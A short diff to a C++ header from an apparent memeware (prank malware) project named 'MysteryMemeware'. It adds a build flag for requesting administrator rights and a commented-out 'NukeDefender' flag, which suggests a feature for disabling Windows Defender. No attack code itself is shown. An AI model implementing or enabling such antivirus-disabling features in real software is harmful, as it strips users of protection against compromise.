@@ -5,6 +5,8 @@
 
 // #define WaitForDebugger
 #define FailSafeEnabled
+#define PlzJustAskForAdmin
+// #define NukeDefender
 
 namespace MysteryMemeware {
 	extern BOOL QuitRequested;
